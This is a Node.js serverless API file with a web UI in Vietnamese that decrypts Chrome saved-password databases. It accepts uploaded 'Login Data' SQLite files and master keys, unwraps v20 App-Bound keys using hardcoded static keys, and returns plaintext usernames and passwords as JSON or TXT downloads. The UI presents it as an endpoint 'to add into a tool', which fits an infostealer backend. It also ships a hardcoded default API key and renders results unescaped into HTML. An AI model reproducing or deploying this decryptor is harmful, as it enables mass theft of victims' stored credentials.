// file: api/index.js
// runtime: Vercel Serverless Node.js 18+ / 20+ / 22+
// env: Set EXTRACTOR_API_KEY in Vercel Dashboard (default fallback: "ollie-secret-key-6767")

const crypto = require('node:crypto');
const http = require('node:http');
const path = require('node:path');
const fs = require('node:fs');
const initSqlJs = require('sql.js');

const DEFAULT_API_KEY = process.env.EXTRACTOR_API_KEY || 'ollie-secret-key-6767';

// Chrome Elevation Service Static Keys (Flag 1 & Flag 2)
const KEY_FLAG1_AES = Buffer.from(
    'B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787',
    'hex'
);
const KEY_FLAG2_CHACHA = Buffer.from(
    'E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660',
    'hex'
);

let SQL_PROMISE = null;
function getSqlEngine() {
    if (!SQL_PROMISE) {
        const wasmPath = path.join(path.dirname(require.resolve('sql.js')), 'sql-wasm.wasm');
        const wasmBinary = fs.readFileSync(wasmPath);
        SQL_PROMISE = initSqlJs({ wasmBinary });
    }
    return SQL_PROMISE;
}

function aeadDecrypt(algo, key, iv, ct, tag) {
    try {
        const decipher = crypto.createDecipheriv(
            algo,
            key,
            iv,
            algo === 'chacha20-poly1305' ? { authTagLength: 16 } : undefined
        );
        decipher.setAuthTag(tag);
        return Buffer.concat([decipher.update(ct), decipher.final()]);
    } catch {
        return null;
    }
}

function parseKeyInput(rawKey) {
    if (!rawKey || typeof rawKey !== 'string') return null;
    const clean = rawKey.trim();
    if (/^[0-9a-fA-F]{64}$/.test(clean)) {
        return Buffer.from(clean, 'hex');
    }
    try {
        const buf = Buffer.from(clean, 'base64');
        if (buf.length === 32) return buf;
        // Support unwrapped user_blob passed as base64
        const unwrapped = tryUnwrapAppBoundBlob(buf);
        if (unwrapped) return unwrapped;
    } catch {}
    return null;
}

function tryUnwrapAppBoundBlob(userBlob) {
    if (!userBlob || userBlob.length < 8) return null;
    const valLen = userBlob.readUInt32LE(0);
    let pos = 4 + valLen;
    if (pos + 4 > userBlob.length) return null;
    const blobLen = userBlob.readUInt32LE(pos);
    pos += 4;
    const keyBlob = userBlob.subarray(pos, pos + blobLen);
    if (keyBlob.length === 32) return keyBlob;
    if (keyBlob.length < 61) return null;

    const flag = keyBlob[0];
    const body = keyBlob.subarray(1);
    const iv = body.subarray(0, 12);
    const ct = body.subarray(12, 44);
    const tag = body.subarray(44, 60);

    if (flag === 1) return aeadDecrypt('aes-256-gcm', KEY_FLAG1_AES, iv, ct, tag);
    if (flag === 2) return aeadDecrypt('chacha20-poly1305', KEY_FLAG2_CHACHA, iv, ct, tag);
    return null;
}

function stripV20DomainHashPrefix(plaintext) {
    if (plaintext.length > 32) {
        let nonAsciiHead = 0;
        for (let i = 0; i < 32; i++) {
            const b = plaintext[i];
            if (b < 0x20 || b > 0x7e) nonAsciiHead++;
        }
        if (nonAsciiHead >= 4) {
            return plaintext.subarray(32).toString('utf8');
        }
    }
    return plaintext.toString('utf8');
}

function decryptPasswordBlob(blob, keys) {
    if (!blob || blob.length === 0) return '<EMPTY>';
    const buf = Buffer.isBuffer(blob) ? blob : Buffer.from(blob);
    const prefix = buf.subarray(0, 3).toString('ascii');

    if (prefix !== 'v10' && prefix !== 'v11' && prefix !== 'v20') {
        return `<RAW_DPAPI_HEX:${buf.toString('hex')}>`;
    }
    if (buf.length < 31) return `<SHORT_BLOB_${buf.length}B>`;

    const iv = buf.subarray(3, 15);
    const ct = buf.subarray(15, buf.length - 16);
    const tag = buf.subarray(buf.length - 16);

    for (const k of keys) {
        if (!k || k.length !== 32) continue;
        const pt = aeadDecrypt('aes-256-gcm', k, iv, ct, tag);
        if (pt) {
            return prefix === 'v20' ? stripV20DomainHashPrefix(pt) : pt.toString('utf8');
        }
    }

    return `<DECRYPT_FAIL (${prefix}) | iv=${iv.toString('hex')} | ct=${ct.toString('hex')} | tag=${tag.toString('hex')}>`;
}

async function parseLoginDataBuffer(sqliteBuffer, candidateKeys) {
    const SQL = await getSqlEngine();
    const db = new SQL.Database(new Uint8Array(sqliteBuffer));
    const records = [];
    try {
        const res = db.exec(`
            SELECT origin_url, action_url, username_value, password_value,
                   signon_realm, date_created, times_used
            FROM logins
            ORDER BY date_created DESC
        `);
        if (res.length > 0) {
            const rows = res[0].values;
            for (const row of rows) {
                const [origin_url, action_url, username_value, pass_blob, signon_realm, date_created, times_used] = row;
                const rawBytes = pass_blob ? Buffer.from(pass_blob) : Buffer.alloc(0);
                const ver = rawBytes.length >= 3 ? rawBytes.subarray(0, 3).toString('ascii') : 'raw';
                const plain = decryptPasswordBlob(rawBytes, candidateKeys);

                if (!username_value && plain === '<EMPTY>') continue;

                records.push({
                    origin_url: origin_url || '',
                    action_url: action_url || '',
                    signon_realm: signon_realm || '',
                    username_value: username_value || '',
                    password_plaintext: plain,
                    encryption_version: ver,
                    times_used: times_used || 0,
                    date_created: date_created || 0,
                });
            }
        }
    } finally {
        db.close();
    }
    return records;
}

function formatTxtOutput(records) {
    return (
        records
            .map(
                (r, idx) =>
                    `[${String(idx + 1).padStart(3, '0')}] URL: ${r.origin_url} | USER: ${r.username_value} | PASS: ${r.password_plaintext} | VER: ${r.encryption_version}`
            )
            .join('\n') + '\n'
    );
}

const WEB_UI_HTML = `<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Chrome Login Data Extractor — Vercel API & Web UI</title>
<style>
  :root { --bg:#0b0f17; --card:#151b26; --border:#2a3447; --accent:#3b82f6; --text:#e2e8f0; --muted:#94a3b8; }
  body { background:var(--bg); color:var(--text); font-family:ui-monospace,SFMono-Regular,Consolas,monospace; margin:0; padding:24px; }
  .container { max-width:1160px; margin:0 auto; }
  .card { background:var(--card); border:1px solid var(--border); border-radius:10px; padding:22px; margin-bottom:20px; }
  h1, h2 { margin-top:0; color:#60a5fa; }
  .grid { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
  .field { margin-bottom:14px; }
  label { display:block; font-size:13px; color:var(--muted); margin-bottom:6px; font-weight:600; }
  input, select { width:100%; padding:10px; background:#0b0f17; border:1px solid var(--border); color:var(--text); border-radius:6px; box-sizing:border-box; font-family:inherit; }
  .btns { display:flex; gap:10px; flex-wrap:wrap; margin-top:10px; }
  button { background:var(--accent); color:#fff; border:none; padding:10px 18px; border-radius:6px; cursor:pointer; font-weight:700; font-family:inherit; }
  button.secondary { background:#10b981; }
  button:hover { opacity:0.92; }
  pre { background:#080b11; border:1px solid var(--border); padding:12px; border-radius:6px; overflow-x:auto; font-size:12px; color:#a5b4fc; }
  table { width:100%; border-collapse:collapse; margin-top:16px; font-size:12.5px; }
  th, td { border:1px solid var(--border); padding:8px 10px; text-align:left; word-break:break-all; }
  th { background:#1e293b; color:#93c5fd; }
  .badge { padding:2px 6px; border-radius:4px; background:#1e3a8a; color:#bfdbfe; font-size:11px; }
</style>
</head>
<body>
<div class="container">
  <div class="card">
    <h1>CHROME LOGIN DATA EXTRACTOR (VERCEL API + WEB UI)</h1>
    <form id="extractForm">
      <div class="grid">
        <div class="field">
          <label>API Key (Header: x-api-key) *</label>
          <input type="password" id="apiKey" placeholder="Nhap API Key (VD: ollie-secret-key-6767)" required />
        </div>
        <div class="field">
          <label>File "Login Data" (SQLite) *</label>
          <input type="file" id="loginFile" required />
        </div>
        <div class="field">
          <label>v20 Master Key (64-hex hoac Base64, tuy chon)</label>
          <input type="text" id="v20Key" placeholder="64 ky tu hex hoac base64 unwrapped key" />
        </div>
        <div class="field">
          <label>v10 Master Key (64-hex hoac Base64, tuy chon)</label>
          <input type="text" id="v10Key" placeholder="64 ky tu hex hoac base64 DPAPI key" />
        </div>
      </div>
      <div class="btns">
        <button type="submit" data-mode="json">1. Giai Ma & Xem Truc Tiep</button>
        <button type="button" class="secondary" id="btnDownloadTxt">2. Gui API & Tai Thang File .TXT</button>
        <button type="button" class="secondary" id="btnDownloadJson">3. Gui API & Tai Thang File .JSON</button>
      </div>
    </form>
    <div id="status" style="margin-top:14px;color:#94a3b8;font-size:13px;"></div>
    <div id="tableWrap"></div>
  </div>

  <div class="card">
    <h2>THONG TIN ENDPOINT DE ADD VAO TOOL</h2>
    <pre>POST /api/extract
Headers:
  x-api-key: &lt;YOUR_API_KEY&gt;
  Content-Type: application/json (hoac application/octet-stream neu gui raw binary file)

Query / Body Params:
  - output: "txt" | "json" | "file" (tra thang file dinh kem Content-Disposition: attachment)
  - v20_key: "&lt;64-hex-master-key&gt;" (hoac header x-v20-key)
  - v10_key: "&lt;64-hex-master-key&gt;" (hoac header x-v10-key)
  - login_data_b64: "&lt;base64_sqlite_file&gt;" (neu gui JSON)</pre>
  </div>
</div>

<script>
const fileToB64 = (file) => new Promise((res, rej) => {
  const r = new FileReader();
  r.onload = () => res(r.result.split(',')[1]);
  r.onerror = rej;
  r.readAsDataURL(file);
});

async function callApi(outputFormat) {
  const apiKey = document.getElementById('apiKey').value.trim();
  const fileInput = document.getElementById('loginFile').files[0];
  const v20Key = document.getElementById('v20Key').value.trim();
  const v10Key = document.getElementById('v10Key').value.trim();
  const statusEl = document.getElementById('status');
  const tableWrap = document.getElementById('tableWrap');

  if (!apiKey || !fileInput) {
    statusEl.textContent = '[!] Vui long nhap API Key va chon file Login Data.';
    return;
  }

  statusEl.textContent = 'Dang gui file Login Data len API endpoint...';
  const loginB64 = await fileToB64(fileInput);

  const resp = await fetch('/api/extract?output=' + encodeURIComponent(outputFormat), {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'x-api-key': apiKey
    },
    body: JSON.stringify({
      login_data_b64: loginB64,
      v20_key: v20Key,
      v10_key: v10Key,
      output: outputFormat
    })
  });

  if (!resp.ok) {
    const errText = await resp.text();
    statusEl.textContent = '[!] Loi API (' + resp.status + '): ' + errText;
    return;
  }

  if (outputFormat === 'txt_file' || outputFormat === 'json_file') {
    const blob = await resp.blob();
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = outputFormat === 'txt_file' ? 'decrypted_accounts.txt' : 'decrypted_logins.json';
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
    statusEl.textContent = '[+] Da nhan va tai file trich xuat tu API thanh cong!';
    return;
  }

  const data = await resp.json();
  statusEl.textContent = '[+] Trich xuat thanh cong ' + data.total + ' tai khoan.';
  let html = '<table><thead><tr><th>#</th><th>Origin URL</th><th>Username</th><th>Password</th><th>Ver</th></tr></thead><tbody>';
  data.records.forEach((r, i) => {
    html += '<tr><td>' + (i + 1) + '</td><td>' + r.origin_url + '</td><td>' + r.username_value + '</td><td>' + r.password_plaintext + '</td><td><span class="badge">' + r.encryption_version + '</span></td></tr>';
  });
  html += '</tbody></table>';
  tableWrap.innerHTML = html;
}

document.getElementById('extractForm').addEventListener('submit', (e) => {
  e.preventDefault();
  callApi('json');
});
document.getElementById('btnDownloadTxt').addEventListener('click', () => callApi('txt_file'));
document.getElementById('btnDownloadJson').addEventListener('click', () => callApi('json_file'));
</script>
</body>
</html>`;

function readRequestBuffer(req) {
    return new Promise((resolve, reject) => {
        const chunks = [];
        req.on('data', (c) => chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(c)));
        req.on('end', () => resolve(Buffer.concat(chunks)));
        req.on('error', reject);
    });
}

async function handler(req, res) {
    // Enable CORS for external tools
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-api-key, x-v10-key, x-v20-key');

    if (req.method === 'OPTIONS') {
        res.statusCode = 204;
        return res.end();
    }

    const parsedUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);

    if (req.method === 'GET' && (parsedUrl.pathname === '/' || parsedUrl.pathname === '/api')) {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        return res.end(WEB_UI_HTML);
    }

    if (req.method === 'POST' && parsedUrl.pathname.startsWith('/api/extract')) {
        const clientKey =
            req.headers['x-api-key'] ||
            parsedUrl.searchParams.get('api_key') ||
            parsedUrl.searchParams.get('apikey');

        if (clientKey !== DEFAULT_API_KEY) {
            res.writeHead(401, { 'Content-Type': 'application/json; charset=utf-8' });
            return res.end(JSON.stringify({ ok: false, error: 'Invalid or missing x-api-key' }));
        }

        try {
            const rawBody = await readRequestBuffer(req);
            const contentType = (req.headers['content-type'] || '').toLowerCase();

            let sqliteBuffer = null;
            let v20Raw = req.headers['x-v20-key'] || parsedUrl.searchParams.get('v20_key') || '';
            let v10Raw = req.headers['x-v10-key'] || parsedUrl.searchParams.get('v10_key') || '';
            let outputMode = parsedUrl.searchParams.get('output') || 'json';

            if (contentType.includes('application/json')) {
                const bodyJson = JSON.parse(rawBody.toString('utf8'));
                if (!bodyJson.login_data_b64) {
                    throw new Error('Missing login_data_b64 in JSON payload');
                }
                sqliteBuffer = Buffer.from(bodyJson.login_data_b64, 'base64');
                v20Raw = bodyJson.v20_key || v20Raw;
                v10Raw = bodyJson.v10_key || v10Raw;
                outputMode = bodyJson.output || outputMode;
            } else {
                // Direct binary upload (application/octet-stream) from tool
                sqliteBuffer = rawBody;
            }

            if (!sqliteBuffer || sqliteBuffer.length < 100) {
                throw new Error('Invalid or empty SQLite Login Data file');
            }

            const candidateKeys = [parseKeyInput(v20Raw), parseKeyInput(v10Raw)].filter(Boolean);
            const records = await parseLoginDataBuffer(sqliteBuffer, candidateKeys);

            if (outputMode === 'txt' || outputMode === 'txt_file' || outputMode === 'file') {
                const txtPayload = formatTxtOutput(records);
                res.writeHead(200, {
                    'Content-Type': 'text/plain; charset=utf-8',
                    'Content-Disposition': 'attachment; filename="decrypted_accounts.txt"',
                });
                return res.end(txtPayload);
            }

            if (outputMode === 'json_file') {
                const jsonPayload = JSON.stringify(records, null, 2);
                res.writeHead(200, {
                    'Content-Type': 'application/json; charset=utf-8',
                    'Content-Disposition': 'attachment; filename="decrypted_logins.json"',
                });
                return res.end(jsonPayload);
            }

            res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
            return res.end(
                JSON.stringify({
                    ok: true,
                    total: records.length,
                    records,
                    txt_content: formatTxtOutput(records),
                })
            );
        } catch (err) {
            res.writeHead(400, { 'Content-Type': 'application/json; charset=utf-8' });
            return res.end(JSON.stringify({ ok: false, error: err.message }));
        }
    }

    res.writeHead(404, { 'Content-Type': 'application/json; charset=utf-8' });
    res.end(JSON.stringify({ ok: false, error: 'Route not found' }));
}

module.exports = handler;

// Local standalone server fallback when running `node api/index.js`
if (require.main === module) {
    const port = process.env.PORT || 3000;
    http.createServer(handler).listen(port, () => {
        console.log(`[+] Server running at http://127.0.0.1:${port}`);
        console.log(`[*] Default API Key: ${DEFAULT_API_KEY}`);
    });
}
